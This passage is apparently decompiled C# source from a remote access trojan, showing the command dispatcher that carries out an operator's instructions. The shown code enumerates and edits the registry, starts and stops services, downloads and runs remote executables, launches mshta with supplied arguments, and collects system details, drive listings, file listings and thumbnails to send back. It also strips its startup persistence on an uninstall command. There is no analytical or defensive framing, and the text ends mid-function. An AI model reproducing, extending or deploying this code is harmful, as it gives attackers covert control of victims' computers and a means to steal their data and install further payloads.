using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class IND
{
	public delegate void indd(string T);

	public static string TM = Interaction.Environ("temp") + "\\";

	public static string Y = "^:^";

	private static int ER;

	public static int LPING;

	public static chat Ca = new chat();

	private static byte[] cdll;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	private static string pk;

	static IND()
	{
		byte[] cam = Resources.Cam;
		bool Compress = false;
		cdll = API.ZIP(cam, ref Compress);
	}

	public static void inddd(string T)
	{
		RichTextBox t = B.Chat.T1;
		t.set_Text(t.get_Text() + B.Chat.nick + " : " + T + "\r\n");
	}

	public static RegistryKey Rk(ref string p, ref bool W)
	{
		Array array = Strings.Split(p, "\\", -1, (CompareMethod)0);
		object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CLASSES_ROOT", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_USER", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_LOCAL_MACHINE", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_USERS", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_Users().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_CONFIG", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		RegistryKey result = default(RegistryKey);
		return result;
	}

	public static void ind(byte[] Da)
	{
		//IL_09ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b15: Expected O, but got Unknown
		//IL_1b2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b31: Expected O, but got Unknown
		//IL_295d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2964: Expected O, but got Unknown
		//IL_3c56: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c5d: Expected O, but got Unknown
		ER = 0;
		string @string = Encoding.UTF8.GetString(Da);
		int num8 = default(int);
		try
		{
			Array array = Strings.Split(@string, Y, -1, (CompareMethod)0);
			switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString())
			{
			case "#KON":
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"T", false))
				{
					B.KON = true;
				}
				else
				{
					B.KON = false;
				}
				break;
			case "#RG":
			{
				ER = 1;
				object obj4 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
				if (Operators.ConditionalCompareObjectEqual(obj4, (object)"~", false))
				{
					object[] array13 = new object[1];
					object[] array66 = array13;
					int num5 = 2;
					array66[0] = 2;
					string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					bool Compress = false;
					RegistryKey registryKey = Rk(ref T2, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
					RegistryKey registryKey2 = registryKey;
					string[] subKeyNames = registryKey2.GetSubKeyNames();
					string text39 = default(string);
					foreach (string text38 in subKeyNames)
					{
						string text40 = text39;
						T2 = text38 + Y + Y + "Key";
						text39 = text40 + API.ENB(ref T2) + Y;
					}
					string[] valueNames = registryKey2.GetValueNames();
					foreach (string text41 in valueNames)
					{
						string text42 = registryKey2.GetValue(text41, RuntimeHelpers.GetObjectValue(new object()))!.ToString();
						if (text42.Length > 200)
						{
							text42 = Strings.Mid(text42, 1, 200);
						}
						string text43 = text39;
						T2 = text41 + Y + text42 + Y + "Value";
						text39 = text43 + API.ENB(ref T2) + Y;
					}
					B b24 = MyProject.Forms.B;
					T2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("#RG" + Y, "~"), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y), (object)text39));
					b24.SEND(ref T2);
				}
				else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"!", false))
				{
					object[] array13 = new object[1];
					object[] array67 = array13;
					int num5 = 2;
					array67[0] = 2;
					string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					bool Compress = true;
					RegistryKey registryKey3 = Rk(ref T2, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
					RegistryKey registryKey4 = registryKey3;
					registryKey4.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"@", false))
				{
					object[] array13 = new object[1];
					object[] array68 = array13;
					int num5 = 2;
					array68[0] = 2;
					string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					bool Compress = true;
					RegistryKey registryKey5 = Rk(ref T2, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
					RegistryKey registryKey6 = registryKey5;
					int num38 = array.Length - 1;
					for (int num39 = 3; num39 <= num38; num39++)
					{
						Array array69 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num39 }, (string[])null)), "\\", -1, (CompareMethod)0);
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array69, new object[1] { 1 }, (string[])null), (object)"Key", false))
						{
							registryKey6.DeleteSubKeyTree(Conversions.ToString(NewLateBinding.LateIndexGet((object)array69, new object[1] { 0 }, (string[])null)));
						}
						else
						{
							registryKey6.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array69, new object[1] { 0 }, (string[])null)));
						}
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"#", false))
				{
					object[] array13 = new object[1];
					object[] array70 = array13;
					int num5 = 2;
					array70[0] = 2;
					string T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					bool Compress = true;
					RegistryKey registryKey7 = Rk(ref T2, ref Compress);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, T2 }, (string[])null, true, false);
					RegistryKey registryKey8 = registryKey7;
					registryKey8.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
				}
				break;
			}
			case "#k":
				ER = 1;
				if (File.Exists(Application.get_StartupPath() + "\\" + B.exename) && FileSystem.FileLen(Application.get_StartupPath() + "\\" + B.exename) > 0L)
				{
					B b15 = MyProject.Forms.B;
					string T2 = "#k" + Y + File.ReadAllText(Application.get_StartupPath() + "\\" + B.exename);
					b15.SEND(ref T2);
				}
				else
				{
					B b16 = MyProject.Forms.B;
					string T2 = "#k" + Y + "..";
					b16.SEND(ref T2);
				}
				break;
			case "#X":
			{
				ER = 0;
				int num16 = 8 + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length;
				MemoryStream memoryStream8 = new MemoryStream();
				int num17 = Da.Length - 1;
				for (int num18 = num16; num18 <= num17; num18++)
				{
					memoryStream8.WriteByte(Da[num18]);
				}
				byte[] byt2 = memoryStream8.ToArray();
				bool Compress = false;
				byte[] bytes = API.ZIP(byt2, ref Compress);
				int num19 = 0;
				do
				{
					if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
					{
						try
						{
							File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
							File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
							NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
							break;
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7, num8);
							ProjectData.ClearProjectError();
						}
						num19++;
						continue;
					}
					File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
					break;
				}
				while (num19 <= 999);
				break;
			}
			case "##":
			{
				ER = 5;
				((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().SetValue("p", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				B b8 = MyProject.Forms.B;
				string T2 = "plugin";
				b8.SEND(ref T2);
				break;
			}
			case "#Rec":
				B.XRec = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				MyProject.Forms.B.Dis();
				break;
			case "#ser0":
			{
				ER = 1;
				ServiceController[] services3 = ServiceController.GetServices();
				string text32 = default(string);
				string T2;
				foreach (ServiceController val6 in services3)
				{
					string text33 = text32;
					string y7 = Y;
					T2 = val6.get_ServiceName() + "{}" + Strings.Replace(Strings.Replace(Conversions.ToString(val6.get_CanStop()), Conversions.ToString(true), "Yes", 1, -1, (CompareMethod)0), Conversions.ToString(false), "No", 1, -1, (CompareMethod)0) + "{}" + ((Enum)val6.get_Status()).ToString() + "{}" + val6.get_DisplayName();
					text32 = text33 + y7 + API.ENB(ref T2);
				}
				B b22 = MyProject.Forms.B;
				T2 = "#ser0" + text32;
				b22.SEND(ref T2);
				break;
			}
			case "#ser1":
			{
				ER = 1;
				ServiceController[] services2 = ServiceController.GetServices();
				foreach (ServiceController val5 in services2)
				{
					if (Operators.ConditionalCompareObjectEqual((object)val5.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
					{
						val5.Start();
					}
				}
				break;
			}
			case "#ser2":
			{
				ER = 1;
				ServiceController[] services = ServiceController.GetServices();
				foreach (ServiceController val4 in services)
				{
					if (Operators.ConditionalCompareObjectEqual((object)val4.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
					{
						val4.Stop();
					}
				}
				break;
			}
			case "#R":
			{
				ER = 0;
				B.Nkey.SetValue("vname", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				B.Vname = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				B b12 = MyProject.Forms.B;
				string T2 = Conversions.ToString(Operators.ConcatenateObject((object)("#R" + Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
				b12.SEND(ref T2);
				break;
			}
			case "ping":
			{
				B b10 = MyProject.Forms.B;
				string T2 = "pong";
				b10.SEND(ref T2);
				break;
			}
			case "#0":
			{
				ER = 0;
				B b17 = MyProject.Forms.B;
				string T2 = "#red";
				b17.SEND(ref T2);
				Thread thread2 = new Thread(delegate(object a0)
				{
					Du((Array)a0);
				});
				object[] array13 = new object[1];
				object[] array43 = array13;
				int num5 = 1;
				array43[0] = 1;
				T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
				string text23 = API.DEB(ref T2);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T2 }, (string[])null, true, false);
				Du(Strings.Split(text23, Y, -1, (CompareMethod)0));
				do
				{
					num8 = 0;
					Thread.Sleep(5);
				}
				while (thread2.IsAlive);
				B b18 = MyProject.Forms.B;
				T2 = "#Bla";
				b18.SEND(ref T2);
				break;
			}
			case "#1":
			{
				B b4 = MyProject.Forms.B;
				string T2 = "#red";
				b4.SEND(ref T2);
				ER = 0;
				Thread thread = new Thread(delegate(object a0)
				{
					DT((Array)a0);
				});
				object[] array13 = new object[1];
				object[] array14 = array13;
				int num5 = 1;
				array14[0] = 1;
				T2 = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
				string text4 = API.DEB(ref T2);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, T2 }, (string[])null, true, false);
				DT(Strings.Split(text4, Y, -1, (CompareMethod)0));
				do
				{
					num8 = 1;
					Thread.Sleep(5);
				}
				while (thread.IsAlive);
				B b5 = MyProject.Forms.B;
				T2 = "#Bla";
				b5.SEND(ref T2);
				break;
			}
			case "#2":
			{
				ER = 0;
				string text29 = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0)[Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0).Length - 1];
				int num25 = 0;
				int num26 = default(int);
				do
				{
					IL_0e73:
					if (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num25) + text29))
					{
						try
						{
							File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num25) + text29);
							num26++;
							if (num26 > 5)
							{
								break;
							}
						}
						catch (Exception ex10)
						{
							ProjectData.SetProjectError(ex10, num8);
							ProjectData.ClearProjectError();
							goto IL_0e61;
						}
						goto IL_0e73;
					}
					string text30 = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num25) + text29;
					Network network = ((ServerComputer)MyProject.Computer).get_Network();
					object[] array51 = new object[2];
					object[] array52 = array51;
					object[] array13 = new object[1];
					object[] array53 = array13;
					int num5 = 1;
					array53[0] = 1;
					array52[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					array51[1] = text30;
					object[] array54 = array51;
					object[] array55 = array54;
					bool[] array56 = new bool[2] { true, true };
					NewLateBinding.LateCall((object)network, (Type)null, "DownloadFile", array55, (string[])null, (Type[])null, array56, true);
					if (array56[0])
					{
						NewLateBinding.LateIndexSetComplex((object)array, new object[2]
						{
							num5,
							RuntimeHelpers.GetObjectValue(array54[0])
						}, (string[])null, true, false);
					}
					if (array56[1])
					{
						text30 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array54[1]), typeof(string));
					}
					Process.Start(text30);
					break;
					IL_0e61:
					num25++;
				}
				while (num25 <= 9999);
				break;
			}
			case "#3":
			{
				ER = 0;
				MemoryStream memoryStream10 = new MemoryStream();
				byte[] bytes2 = Encoding.Default.GetBytes("#4" + Y);
				memoryStream10.Write(bytes2, 0, bytes2.Length);
				Encoding @default = Encoding.Default;
				string T2 = "plugin.C";
				string T = "Pass";
				object P = null;
				string S = Conversions.ToString(global::n.C.inv(ref global::n.C.Plug, ref T2, ref T, ref P));
				byte[] bytes3 = @default.GetBytes(API.ENB(ref S));
				bool Compress = true;
				bytes2 = API.ZIP(bytes3, ref Compress);
				memoryStream10.Write(bytes2, 0, bytes2.Length);
				MyProject.Forms.B.WC.SendData(memoryStream10.ToArray());
				break;
			}
			case "#4":
				if (B.Rec)
				{
					ProjectData.EndApp();
				}
				ER = 0;
				try
				{
					MyProject.Forms.B.BW.B.Dispose();
					A.fj.Dispose();
				}
				catch (Exception ex14)
				{
					ProjectData.SetProjectError(ex14, num8);
					ProjectData.ClearProjectError();
				}
				if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"!", false))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(B.SU);
					}
					catch (Exception ex15)
					{
						ProjectData.SetProjectError(ex15, num8);
						ProjectData.ClearProjectError();
					}
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(B.SU);
					}
					catch (Exception ex16)
					{
						ProjectData.SetProjectError(ex16, num8);
						ProjectData.ClearProjectError();
					}
					try
					{
						B.Nkey.DeleteValue("vname");
					}
					catch (Exception ex17)
					{
						ProjectData.SetProjectError(ex17, num8);
						ProjectData.ClearProjectError();
					}
					try
					{
						B.Nkey.DeleteValue("FL");
					}
					catch (Exception ex18)
					{
						ProjectData.SetProjectError(ex18, num8);
						ProjectData.ClearProjectError();
					}
					try
					{
						DriveInfo[] drives2 = DriveInfo.GetDrives();
						foreach (DriveInfo driveInfo2 in drives2)
						{
							if (!driveInfo2.IsReady || driveInfo2.TotalFreeSpace <= 0L)
							{
								continue;
							}
							try
							{
								if (File.Exists(driveInfo2.Name + B.Uo))
								{
									File.Delete(driveInfo2.Name + B.Uo);
								}
							}
							catch (Exception ex19)
							{
								ProjectData.SetProjectError(ex19, num8);
								ProjectData.ClearProjectError();
							}
						}
					}
					catch (Exception ex20)
					{
						ProjectData.SetProjectError(ex20, num8);
						ProjectData.ClearProjectError();
					}
					Process[] processesByName = Process.GetProcessesByName("wscript");
					foreach (Process process3 in processesByName)
					{
						try
						{
							process3.Kill();
						}
						catch (Exception ex21)
						{
							ProjectData.SetProjectError(ex21, num8);
							ProjectData.ClearProjectError();
						}
					}
					try
					{
						string path17 = Application.get_StartupPath() + "\\j.vbs";
						string S = Resources.W;
						File.WriteAllText(path17, API.DEB(ref S).Replace("NJ", Application.get_ExecutablePath()));
						Process.Start(Application.get_StartupPath() + "\\j.vbs");
					}
					catch (Exception ex22)
					{
						ProjectData.SetProjectError(ex22, num8);
						ProjectData.ClearProjectError();
					}
				}
				ProjectData.EndApp();
				break;
			case "#5":
			{
				ER = 0;
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				processStartInfo2.FileName = "mshta.exe";
				processStartInfo2.Arguments = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
				processStartInfo2.CreateNoWindow = true;
				processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				Process process2 = Process.Start(processStartInfo2);
				Thread.Sleep(60000);
				try
				{
					process2.Kill();
					break;
				}
				catch (Exception ex13)
				{
					ProjectData.SetProjectError(ex13, num8);
					ProjectData.ClearProjectError();
					break;
				}
			}
			case "#6":
				ER = 0;
				try
				{
					MyProject.Forms.B.BW.B.Dispose();
					if (A.fj.Id > 1)
					{
						A.fj.Kill();
					}
				}
				catch (Exception ex12)
				{
					ProjectData.SetProjectError(ex12, num8);
					ProjectData.ClearProjectError();
				}
				Process.Start(Application.get_ExecutablePath());
				ProjectData.EndApp();
				break;
			case "#7":
			{
				ER = 2;
				object[] array5 = new object[1];
				object[] array47 = array5;
				int num5 = 1;
				array47[0] = 1;
				int num3 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				byte[] array48 = sc.gc(ref num3);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num3 }, (string[])null, true, false);
				byte[] array49 = array48;
				if (array49.Length == 0)
				{
					B b20 = MyProject.Forms.B;
					string S = "#5" + Y + Conversions.ToString(0);
					b20.SEND(ref S);
				}
				else
				{
					MemoryStream memoryStream9 = new MemoryStream();
					memoryStream9.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
					memoryStream9.Write(array49, 0, array49.Length);
					MyProject.Forms.B.WC.SendData(memoryStream9.ToArray());
				}
				break;
			}
			case "#8":
			{
				string text27 = "\r\n";
				string text28 = text28 + "PC InfoX*X==" + text27;
				text28 = text28 + "PC\\UserX*X" + B.PC + text27;
				text28 = text28 + "CountryX*X" + API.Gc() + text27;
				text28 = text28 + "OSX*X" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Windows", "")
					.Replace("  ", " ")
					.Replace("Microsoft", "")
					.Replace("®", "")
					.Replace("™", "") + text27;
				text28 = Conversions.ToString(Operators.AddObject((object)text28, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ProcessorX*X", ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")!.GetValue("~mhz")), (object)" *"), (object)Environment.ProcessorCount), (object)"~MHZ"), (object)text27)));
				text28 = text28 + "RAMX*X" + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1073741824.0), "#0.00 GB") + text27;
				text28 = text28 + "UpTimeX*X" + Strings.Split(Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5), ".", -1, (CompareMethod)0)[0] + " :Hours" + text27;
				text28 = text28 + "Server InfoX*X==" + text27;
				text28 = text28 + "ServerX*X" + API.DEB(ref B.Vname) + text27;
				text28 = text28 + "Host:PortX*X" + B.no + text27;
				text28 = text28 + "DirectoryX*X" + Application.get_StartupPath() + text27;
				text28 = text28 + "ExeNameX*X" + AppDomain.CurrentDomain.FriendlyName + text27;
				text28 = text28 + "Process IDX*X" + Conversions.ToString(Process.GetCurrentProcess().Id) + text27;
				text28 = text28 + "StartupX*X" + B.SU + text27;
				text28 = text28 + "PersistantX*X" + Conversions.ToString(B.UU) + text27;
				text28 = text28 + "SpreadX*X" + B.spread + text27;
				text28 = text28 + "MutexX*X" + B.mU + text27;
				text28 = text28 + "First RunX*X" + B.FR + text27;
				text28 = text28 + "RegKeyX*X" + B.Nkey.Name + text27;
				text28 = text28 + "Firewall BypassX*X" + Strings.Replace(B.Fw.ToString(), "True", "Yes", 1, -1, (CompareMethod)0).Replace("False", "No");
				B b19 = MyProject.Forms.B;
				string S = "#7" + Y + API.ENB(ref text28);
				b19.SEND(ref S);
				break;
			}
			case "#9":
			{
				ER = 1;
				DriveInfo[] drives = DriveInfo.GetDrives();
				string text21 = default(string);
				string S;
				foreach (DriveInfo driveInfo in drives)
				{
					if (driveInfo.IsReady)
					{
						string text22 = text21;
						string y6 = Y;
						S = driveInfo.Name;
						text21 = text22 + y6 + API.ENB(ref S);
					}
				}
				B b14 = MyProject.Forms.B;
				string[] array31 = new string[8] { "#8", text21, Y, null, null, null, null, null };
				string[] array40 = array31;
				string T2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
				array40[3] = API.ENB(ref T2);
				array31[4] = Y;
				string[] array41 = array31;
				string T = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
				array41[5] = API.ENB(ref T);
				array31[6] = Y;
				string[] array42 = array31;
				S = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
				array42[7] = API.ENB(ref S);
				string C = string.Concat(array31);
				b14.SEND(ref C);
				break;
			}
			case "#10":
			{
				ER = 1;
				object[] array5 = new object[1];
				object[] array26 = array5;
				int num3 = 1;
				array26[0] = 1;
				string C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				string path8 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string[] directories = Directory.GetDirectories(path8);
				string text10 = default(string);
				foreach (string text9 in directories)
				{
					string text11 = text10;
					string y2 = Y;
					object[] array13 = new object[1];
					object[] array27 = array13;
					int num5 = 1;
					array27[0] = 1;
					string S = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array13, (string[])null));
					string text12 = API.DEB(ref S);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, S }, (string[])null, true, false);
					string T = Strings.Replace(text9, text12, "", 1, -1, (CompareMethod)0) + "*DIR";
					text10 = text11 + y2 + API.ENB(ref T);
				}
				string[] array28 = new string[5] { "png", "jpg", "jpeg", "bmp", "ico" };
				array5 = new object[1];
				object[] array29 = array5;
				num3 = 1;
				array29[0] = 1;
				C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
				string path9 = API.DEB(ref C);
				NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
				string[] files = Directory.GetFiles(path9);
				bool flag = default(bool);
				foreach (string text13 in files)
				{
					string[] array30 = array28;
					foreach (string text14 in array30)
					{
						if (Operators.CompareString(text14.ToLower(), Strings.Split(text13, ".", -1, (CompareMethod)0)[Strings.Split(text13, ".", -1, (CompareMethod)0).Length - 1].ToLower(), false) == 0)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						try
						{
							Image val2 = Image.FromFile(text13);
							MemoryStream memoryStream7 = new MemoryStream();
							EncoderParameters val3 = new EncoderParameters(1);
							val3.get_Param()[0] = new EncoderParameter(Encoder.Quality, 40L);
							ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
							Image thumbnailImage = val2.GetThumbnailImage(20, 20, (GetThumbnailImageAbort)null, IntPtr.Zero);
							thumbnailImage.Save((Stream)memoryStream7, encoderInfo, val3);
							string text15 = text10;
							string y3 = Y;
							string[] array31 = new string[5];
							string[] array32 = array31;
							array5 = new object[1];
							object[] array33 = array5;
							num3 = 1;
							array33[0] = 1;
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
							string text16 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
							array32[0] = Strings.Replace(text13, text16, "", 1, -1, (CompareMethod)0);
							array31[1] = "*";
							array31[2] = Conversions.ToString(FileSystem.FileLen(text13));
							array31[3] = "*";
							array31[4] = API.FEN(memoryStream7.ToArray());
							string S = string.Concat(array31);
							text10 = text15 + y3 + API.ENB(ref S);
							memoryStream7.Dispose();
							val3.Dispose();
							val2.Dispose();
						}
						catch (Exception ex6)
						{
							ProjectData.SetProjectError(ex6, num8);
							string text17 = text10;
							string y4 = Y;
							array5 = new object[1];
							object[] array34 = array5;
							num3 = 1;
							array34[0] = 1;
							C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
							string text18 = API.DEB(ref C);
							NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
							string S = Strings.Replace(text13, text18, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text13));
							text10 = text17 + y4 + API.ENB(ref S);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						string text19 = text10;
						string y5 = Y;
						array5 = new object[1];
						object[] array35 = array5;
						num3 = 1;
						array35[0] = 1;
						C = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array5, (string[])null));
						string text20 = API.DEB(ref C);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, C }, (string[])null, true, false);
						string S = Strings.Replace(text13, text20, "", 1, -1, (CompareMethod)0) + "*" + Conversions.ToString(FileSystem.FileLen(text13));
						text10 = text19 + y5 + API.ENB(ref S);
					}
				}
				B b11 = MyProject.Forms.B;
				C = "#9" + text10;
				b11.SEND(ref C);
				text10 = "";
				break;
			}
			case "#11":
			{
				ER = 1;
				int num12 = array.Length - 1;
				for (int m = 1; m <= num12; m++)
				{
					try
					{
